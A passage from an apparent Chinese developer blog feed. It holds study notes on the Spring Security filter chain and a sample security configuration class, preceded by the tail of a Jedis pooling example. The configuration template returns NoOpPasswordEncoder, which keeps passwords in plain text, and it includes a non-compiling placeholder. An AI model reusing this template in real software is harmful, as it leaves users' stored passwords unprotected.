haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">PooledJedisClient</span> </span>&#123;<br>    <span class="hljs-comment">// 在应用启动时创建连接池</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> JedisPool pool = <span class="hljs-keyword">new</span><span class="hljs-type"></span> JedisPool(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">6379</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getValue(<span class="hljs-keyword">String</span> key) &#123;<br>        <span class="hljs-comment">// 从池里借一个 Jedis 实例，操作完自动归还</span><br>        <span class="hljs-keyword">try</span> (Jedis jedis = pool.getResource()) &#123;<br>            <span class="hljs-keyword">return</span> jedis.<span class="hljs-keyword">get</span>(key);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> void setValue(<span class="hljs-keyword">String</span> key, <span class="hljs-keyword">String</span> value) &#123;<br>        <span class="hljs-keyword">try</span> (Jedis jedis = pool.getResource()) &#123;<br>            jedis.<span class="hljs-keyword">set</span>(key, value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>Netty</code> 好像也能处理这个事情，Redis 就是使用的这个方式，还维护自己的一套nid 线程池？不理解不理解</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java Util Concurrent（JUC）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Security</title>
    <link href="/2025/05/18/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Security/"/>
    <url>/2025/05/18/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Security/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h2 id="1-导图"><a href="#1-导图" class="headerlink" title="1. 导图"></a>1. 导图</h2><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Security/Map%EF%BC%9ASpringSecurity.xmind"></p><hr><h2 id="2-Spring-Security-执行流程"><a href="#2-Spring-Security-执行流程" class="headerlink" title="2. Spring Security 执行流程"></a>2. Spring Security 执行流程</h2><p><span style="background:#fff88f">1. 用户请求（客户端请求）</span><br>每次用户访问受 <code>Spring Security</code> 保护的资源，都会经过以下流程</p><p><span style="background:#fff88f">2. SecurityContextPersistenceFilter 介入</span><br>自动为本线程初始化 <code>SecurityContextHolder</code> 并根据 <code>JSESSIONID</code> 向 <code>HttpSession</code> 查找 <code>SecurityContext</code>（其内保存最重要的 <code>Authentication</code>）</p><ol><li>若存在 <code>SecurityContext</code>，便将其加载到本线程的 <code>SecurityContextHolder</code> 中（基于 HttpSession 实现 “记住我” 功能，我们也可基于 JWT 实现 “记住我” 功能）</li><li>若不存在 <code>SecurityContext</code>，则在本线程中自动初始化一个新的 <code>SecurityContext</code></li></ol><p>即使我们不打算通过 <code>HttpSession</code> 实现 “记住我” 功能（如使用 JWT），甚至完全不使用 <code>HttpSession</code>，我们仍然建议保留这个过滤器，因为它自动为本线程初始化 <code>SecurityContextHolder</code>、并自动创建 <code>SecurityContext</code>，这个能力实在太香了。<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Security/image-20250628224744251.png"></p><p><span style="background:#fff88f">3. UsernamePasswordAuthenticationFilter 介入</span><br>该过滤器主要用于前后端未分离的场景，用于处理默认 <code>/login</code> 路径下的登录请求。  </p><p>在前后端分离的架构中无需深入关注其具体逻辑，只需了解其在过滤器链中的位置，以便在插入自定义过滤器时能准确定位。</p><p><span style="background:#fff88f">4. AnonymousAuthenticationFilter 介入</span><br>如果当前没有任何 <code>Authentication</code>，系统会自动创建一个匿名身份，以避免后续流程中出现空指针异常。</p><p><span style="background:#fff88f">5. FilterSecurityInterceptor 介入</span><br>首先检查当前线程中是否存在 <code>Authentication</code>（无论是否为匿名身份），如果不存在，则抛出 <code>AuthenticationException</code>，表示用户尚未进行认证。</p><p>接着判断是否为匿名用户访问受保护资源：即若用户尚未认证（即为匿名身份 <code>Authentication</code>），且访问的资源未被标注为 <code>permitAll</code>，则抛出 <code>AuthenticationException</code> 异常。</p><p>最后检查当前用户是否具备访问目标资源或方法的权限（包括资源级别和方法级别的访问控制），若权限不足，则抛出 <code>AccessDeniedException</code>。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>整个流程中的异常由 <code>ExceptionTranslation</code> 过滤器统一处理，负责捕获<strong>整个过滤器链中</strong>抛出的 <code>AuthenticationException</code> 和 <code>AccessDeniedException</code> 异常，并执行相应的处理逻辑。</li></ol></blockquote><p><span style="background:#fff88f">6. 执行 API</span><br>在这一步，才真正开始执行我们的 API 逻辑；如果是登录 API，并且通过 AuthenticationManager 进行认证，流程如下：<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Security/image-20250628210023140.png"></p><p><span style="background:#fff88f">7. SecurityContextPersistenceFilter 再次介入</span><br>它会自动将本线程的 <code>SecurityContext</code> 存入服务器的 <code>HttpSession</code>，以便在后续请求中维持用户身份（需要手动开启）</p><p> 随后，过滤器会清空本线程 <code>SecurityContextHolder</code>，防止 <code>SecurityContext</code> 在后续请求中被无意复用，从而确保每个请求都能独立执行认证和授权流程。</p><hr><h2 id="3-Spring-Security-配置"><a href="#3-Spring-Security-配置" class="headerlink" title="3. Spring Security 配置"></a>3. Spring Security 配置</h2><h3 id="3-1-配置模板"><a href="#3-1-配置模板" class="headerlink" title="3.1. 配置模板"></a>3.1. 配置模板</h3><p>Spring Security 的配置主要在 Java 配置类中进行，而不是在 <code>application.yml</code> 文件中，因为安全配置通常涉及到逻辑和条件判断，这些无法简单地通过属性文件表达，我们可以完成以下配置：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.example.securitywithhttpsession.configuration;<br><br><span class="hljs-keyword">import</span> com.example.securitywithhttpsession.service.CustomerUserDetailsImplService;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.annotation.NoClass;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.security.authentication.AuthenticationManager;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.http.SessionCreationPolicy;<br><span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;<br><span class="hljs-keyword">import</span> org.springframework.security.crypto.password.NoOpPasswordEncoder;<br><span class="hljs-keyword">import</span> org.springframework.security.crypto.password.PasswordEncoder;<br><span class="hljs-keyword">import</span> org.springframework.security.web.SecurityFilterChain;<br><span class="hljs-keyword">import</span> org.springframework.security.web.csrf.CsrfTokenRepository;<br><span class="hljs-keyword">import</span> org.springframework.security.web.csrf.HttpSessionCsrfTokenRepository;<br><span class="hljs-keyword">import</span> org.springframework.web.cors.CorsConfiguration;<br><span class="hljs-keyword">import</span> org.springframework.web.cors.CorsConfigurationSource;<br><span class="hljs-keyword">import</span> org.springframework.web.cors.UrlBasedCorsConfigurationSource;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableMethodSecurity</span> <span class="hljs-comment">// 1. 启用方法级别的访问控制</span><br><span class="hljs-meta">@EnableWebSecurity</span> <span class="hljs-comment">// 2. 启用 Spring Security 安全机制</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfiguration</span> </span>&#123;<br>    <br>    <span class="hljs-comment">// 详见下文：配置 CSRF 攻击防护</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">CsrfTokenRepository <span class="hljs-title">csrfTokenRepository</span><span class="hljs-params">()</span> </span>&#123;<br><br>        HttpSessionCsrfTokenRepository repository = <span class="hljs-keyword">new</span> HttpSessionCsrfTokenRepository(); <span class="hljs-comment">// 在HttpSession 中存储</span><br><br>        repository.setHeaderName(<span class="hljs-string">&quot;X-CSRF-TOKEN&quot;</span>); <span class="hljs-comment">// 可自定义请求头名称</span><br>        repository.setParameterName(<span class="hljs-string">&quot;_csrfToken&quot;</span>); <span class="hljs-comment">// 可自定义请求参数名称</span><br>        <span class="hljs-keyword">return</span> repository;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. 配置 CORS 跨域资源共享</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">CorsConfigurationSource <span class="hljs-title">corsConfigurationSource</span><span class="hljs-params">()</span> </span>&#123;<br><br>        CorsConfiguration configuration = <span class="hljs-keyword">new</span> CorsConfiguration();<br>        configuration.addAllowedOrigin(<span class="hljs-string">&quot;http://frontend.example.com&quot;</span>); <span class="hljs-comment">// 只允许特定前端跨域</span><br>        configuration.addAllowedMethod(<span class="hljs-string">&quot;*&quot;</span>); <span class="hljs-comment">// 支持所有方法</span><br>        configuration.addAllowedHeader(<span class="hljs-string">&quot;*&quot;</span>); <span class="hljs-comment">// 支持所有头部</span><br>        configuration.setAllowCredentials(<span class="hljs-keyword">true</span>); <span class="hljs-comment">// 允许携带 Cookie、Session 等凭证</span><br><br>        UrlBasedCorsConfigurationSource source = <span class="hljs-keyword">new</span> UrlBasedCorsConfigurationSource();<br>        source.registerCorsConfiguration(<span class="hljs-string">&quot;/**&quot;</span>, configuration); <span class="hljs-comment">// 应用于本程序哪些路径</span><br>        <span class="hljs-keyword">return</span> source;<br>    &#125;<br><br>    <span class="hljs-comment">// 4. 配置 AuthenticationManager</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">AuthenticationManager <span class="hljs-title">authenticationManager</span><span class="hljs-params">(AuthenticationConfiguration authenticationConfiguration)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> authenticationConfiguration.<span class="hljs-title">getAuthenticationManager</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 从 Spring Security 配置中获取其默认的 AuthenticationManager 实例</span><br>    &#125;<br><br>    <span class="hljs-comment">// 5. 配置 密码加密器</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">PasswordEncoder <span class="hljs-title">passwordEncoder</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> NoOpPasswordEncoder.<span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 返回合适的实现类</span><br>    &#125;<br><br>    <span class="hljs-comment">// 配置 SecurityFilterChain，即我们熟知的那些过滤器链</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function">SecurityFilterChain <span class="hljs-title">securityFilterChain</span><span class="hljs-params">(HttpSecurity httpSecurity)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        httpSecurity<br>                <span class="hljs-comment">// 6. 禁用默认表单登录，同时禁用 UsernamePasswordAuthenticationFilter 过滤器</span><br>                .formLogin(form -&gt; &#123;<br>                    form.disable();<br>                &#125;)<br>                <span class="hljs-comment">// 7. 禁用默认注销功能</span><br>                .logout(logout -&gt; &#123;<br>                    logout.disable();<br>                &#125;)<br>                <span class="hljs-comment">// 8. 配置资源级别的访问控制</span><br>                .authorizeHttpRequests(auth -&gt; &#123;<br>                    auth.requestMatchers(<span class="hljs-string">&quot;/public/**&quot;</span>).permitAll();<br>                &#125;)<br>                <span class="hljs-comment">// 9. 配置用户 未认证、权限不足 的处理</span><br>                .exceptionHandling(<span class="hljs-keyword">handler</span> -&gt; <span class="hljs-keyword">handler</span><br>                        <span class="hljs-comment">// 未认证时的响应（处理 AuthenticationException 异常）</span><br>                        .authenticationEntryPoint((request, response, authException) -&gt; &#123;<br>                                    response.setContentType(<span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>);<br>                                    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);<br>                                    response.getWriter().write(<span class="hljs-string">&quot;&#123;\&quot;error\&quot;:\&quot;未认证，请先登录\&quot;&#125;&quot;</span>);<br>                                &#125;<br>                        )<br>                        <span class="hljs-comment">// 权限不足时的响应（处理 AccessDeniedException 异常）</span><br>                        .accessDeniedHandler((request, response, accessDeniedException) -&gt; &#123;<br>                                    response.setContentType(<span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>);<br>                                    response.setStatus(HttpServletResponse.SC_FORBIDDEN);<br>                                    response.getWriter().write(<span class="hljs-string">&quot;&#123;\&quot;error\&quot;:\&quot;权限不足，无法访问此资源\&quot;&#125;&quot;</span>);<br>                                &#125;<br>                        )<br>                )<br>                <span class="hljs-comment">// 10. 配置 HttpSession</span><br>                .sessionManagement(session -&gt; session<br>                        .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)<br>                )<br><br>                <span class="hljs-comment">// 11. 配置 SecurityContextPersistenceFilter 过滤器</span><br>                .securityContext(security -&gt; &#123;<br>                    security.requireExplicitSave(<span class="hljs-keyword">false</span>);<br>                &#125;)<br><br>                <span class="hljs-comment">// 12. 配置 CSRF 攻击防护</span><br>                .csrf(csrf -&gt; &#123;<br>                    csrf.ignoringRequestMatchers(<span class="hljs-string">&quot;/login&quot;</span>);<br>                    csrf.csrfTokenRepository(csrfTokenRepository());<br>                &#125;)<br><br>                <span class="hljs-comment">// 13. 添加自定义过滤器</span><br>                .addFilterAt(xxxx);<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> httpSecurity.<span class="hljs-title">build</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 构建 SecurityFilterChain 对象</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-2-启用方法级别的访问控制"><a href="#3-2-启用方法级别的访问控制" class="headerlink" title="3.2. 启用方法级别的访问控制"></a>3.2. 启用方法级别的访问控制</h3><p>资源级别的访问控制是指：只有具备指定权限或身份的用户，才能访问特定路径下的资源，例如 <code>/api/admin/**</code> ，详见下文：资源级别的访问控制。</p><p>而方法级别的访问控制则是指：用户必须具备指定的权限或身份，才能调用该方法，详细步骤如下：</p><p><span style="background:#fff88f">1. 配置类上添加 @EnableMethodSecurity 注解</span></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span>  <br><span class="hljs-variable">@EnableMethodSecurity</span>  <span class="hljs-comment">// 启用方法级别的访问控制  </span><br><span class="hljs-variable">@EnableWebSecurity</span>  <br>public class SecurityConfig &#123;  <br>  ......<br>&#125;<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. 使用方法级别的访问控制</span><br>需要注意的是，方法级别的访问控制，一般进行在服务层（Service 层）。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Service</span><br>public class UserService &#123;<br>    <span class="hljs-variable">@PreAuthorize</span>(<span class="hljs-string">&quot;hasRole(&#x27;ADMIN&#x27;)&quot;</span>)<br>    public void <span class="hljs-built_in">adminMethod</span>() &#123;<br>        <span class="hljs-comment">// 只有 ROLE_ADMIN 角色可以执行该方法</span><br>    &#125;<br><br>    <span class="hljs-variable">@PreAuthorize</span>(<span class="hljs-string">&quot;hasAuthority(&#x27;user:user:select&#x27;)&quot;</span>) <br>    public void <span class="hljs-built_in">readUser</span>() &#123;<br>        <span class="hljs-comment">// 只有具有 user:user:select 权限的用户可以执行 用户模块的用户表的查询操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-3-启用-Spring-Security-安全机制"><a href="#3-3-启用-Spring-Security-安全机制" class="headerlink" title="3.3. 启用 Spring Security 安全机制"></a>3.3. 启用 Spring Security 安全机制</h3><p>在配置类中加上 <code>@EnableWebSecurity</code> 后，Spring 会自动注册一个叫做 <code>FilterChainProxy</code> 的安全过滤器链，包含十几个内置的安全过滤器，就是我们熟知的那些过滤器。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>即使你不显式添加这个注解，只要引入了 <code>spring-boot-starter-security</code>，Spring Boot 就会自动注册默认的安全过滤器链。但如果你需要自定义安全配置类（例如我们自己的 <code>SecurityConfiguration</code>），就必须显式启用它，以确保你的配置生效</li></ol></blockquote><hr><h3 id="3-4-配置-AuthenticationManager"><a href="#3-4-配置-AuthenticationManager" class="headerlink" title="3.4. 配置 AuthenticationManager"></a>3.4. 配置 AuthenticationManager</h3><p>在 <code>WebSecurityConfigurerAdapter</code> 时代，<code>AuthenticationManager</code> 是由 Spring 官方默认注册为 Bean 的，因此我们可以直接注入使用。</p><p>但从 Spring Boot 3 开始，Spring 的设计理念发生了变化：“最少暴露、最少干预”，也就是说框架不再自动为你暴露未显式声明的组件，目的是减少默认暴露导致的 Bean 冲突或安全隐患。</p><p>也就是说，Spring 将配置的主动权交还给开发者，所有需要使用的组件开发者都必须通过 <code>@Bean</code> 显式声明，而不是官方为你偷偷注入。即使 Spring Security 已经内部实现了默认的 <code>AuthenticationManager</code>，但也不会自动将其注册为 Bean。例如它在源码中是这样定义的：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthenticationConfiguration</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> AuthenticationManager getAuthenticationManagerBean() &#123;  <br>        <span class="hljs-keyword">return</span> (AuthenticationManager)<span class="hljs-keyword">this</span>.lazyBean(AuthenticationManager.<span class="hljs-keyword">class</span>);  <br>    &#125;  <br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>如果开发者想使用 <code>AuthenticationManager</code>，就需要自己显式地从官方配置中获取其默认实现，或者直接自定义一个。通常我们使用的 <code>AuthenticationManager</code> 实际上就是官方默认实现的那个，除非你有特殊需求需要进行自定义配置，因此我们可以这样手动声明：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Bean</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-function">AuthenticationManager <span class="hljs-title">authenticationManager</span><span class="hljs-params">(AuthenticationConfiguration authenticationConfiguration)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">return</span> authenticationConfiguration.<span class="hljs-title">getAuthenticationManager</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 从 Spring Security 配置中获取其默认的 AuthenticationManager 实例</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="3-5-配置-CORS-跨域资源共享"><a href="#3-5-配置-CORS-跨域资源共享" class="headerlink" title="3.5. 配置 CORS 跨域资源共享"></a>3.5. 配置 CORS 跨域资源共享</h3><p>Spring Security 默认关闭 CORS（跨域资源共享）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2. 启用 CORS 跨域资源共享，并配置跨域规则</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> CorsConfigurationSource <span class="hljs-title function_">corsConfigurationSource</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">CorsConfiguration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorsConfiguration</span>();<br>configuration.addAllowedOrigin(<span class="hljs-string">&quot;http://frontend.example.com&quot;</span>); <span class="hljs-comment">// 只允许特定前端跨域</span><br>configuration.addAllowedMethod(<span class="hljs-string">&quot;*&quot;</span>); <span class="hljs-comment">// 支持所有方法</span><br>configuration.addAllowedHeader(<span class="hljs-string">&quot;*&quot;</span>); <span class="hljs-comment">// 支持所有头部</span><br>configuration.setAllowCredentials(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 允许携带 Cookie、Session 等凭证</span><br><br><span class="hljs-type">UrlBasedCorsConfigurationSource</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlBasedCorsConfigurationSource</span>();<br>source.registerCorsConfiguration(<span class="hljs-string">&quot;/**&quot;</span>, configuration); <span class="hljs-comment">// 应用于本程序哪些路径</span><br><span class="hljs-keyword">return</span> source;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>CORS 只解决跨域访问问题，对于受保护资源的访问，仍需要完成认证，甚至需要校验 CSRF Token。建议在跨域请求时携带一个 JWT，这样可以自动完成身份认证，无需手动处理。</li></ol></blockquote><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">@Bean<br>public CorsConfigurationSource corsConfigurationSource() &#123;<br>    CorsConfiguration config = new CorsConfiguration();<br>    config.setAllowedOrigins(List.of(<span class="hljs-string">&quot;http://localhost:3000&quot;</span>)); // 或 <span class="hljs-string">&quot;*&quot;</span><br>    config.setAllowedMethods(List.of(<span class="hljs-string">&quot;<span class="hljs-keyword">GET</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-keyword">PUT</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-keyword">DELETE</span>&quot;</span>));<br>    config.setAllowedHeaders(List.of(<span class="hljs-string">&quot;*&quot;</span>));<br>    config.setAllowCredentials(true); // 如果你前端携带 cookie，这里要开启<br><br>    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();<br>    source.registerCorsConfiguration(<span class="hljs-string">&quot;/**&quot;</span>, config);<br>    return source;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h3 id="3-6-配置密码加密器"><a href="#3-6-配置密码加密器" class="headerlink" title="3.6. 配置密码加密器"></a>3.6. 配置密码加密器</h3><h4 id="3-6-1-密码加密器概述"><a href="#3-6-1-密码加密器概述" class="headerlink" title="3.6.1. 密码加密器概述"></a>3.6.1. 密码加密器概述</h4><p>在实际应用中，用户密码绝不能以明文方式存储，因为这会带来极大的安全风险。为确保安全性，我们必须在存储前对密码进行加密处理。基于此，我们面临两大问题：</p><ol><li>如何实现密码加密，即如何将明文密码转换为<strong>不可逆</strong>的密文，从而保护用户密码安全</li><li>如何校验密码，即用户提交的明文密码如何与存储的密文密码进行对比，从而验证密码的正确性</li></ol><p><code>PasswordEncoder</code> 是 Spring Security 提供的一个接口，同时它也提供了该接口的很多实现类，能够解决上述两大问题</p><hr><h4 id="3-6-2-PaswordEncoder-常用实现类"><a href="#3-6-2-PaswordEncoder-常用实现类" class="headerlink" title="3.6.2. PaswordEncoder 常用实现类"></a>3.6.2. PaswordEncoder 常用实现类</h4><p>Spring Security 提供了几种常见的 <code>PasswordEncoder</code> 实现类，常用的有：</p><p><span style="background:#fff88f">1. BCryptPasswordEncoder</span><br>基于 BCrypt 算法的密码加密工具，<strong>不能解密，只能对比</strong>，是一种提供较高安全的密码加密方式，能够有效防止暴力破解，适用于大多数应用。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Bean</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-title class_">PasswordEncoder</span> <span class="hljs-title function_">passwordEncoder</span>(<span class="hljs-params"></span>) &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();  <br>&#125;<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. NoOpPasswordEncoder</span><br>不对密码进行加密，直接返回原始密码，通常用于开发、测试环境，不建议在生产环境中使用。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Bean</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-function">PasswordEncoder <span class="hljs-title">passwordEncoder</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">return</span> NoOpPasswordEncoder.<span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">3. Pbkdf2PasswordEncoder</span><br>基于 PBKDF2 算法的密码加密工具</p><p><span style="background:#fff88f">4. SCryptPasswordEncoder</span><br>基于 scrypt 算法的密码加密工具。</p><hr><h4 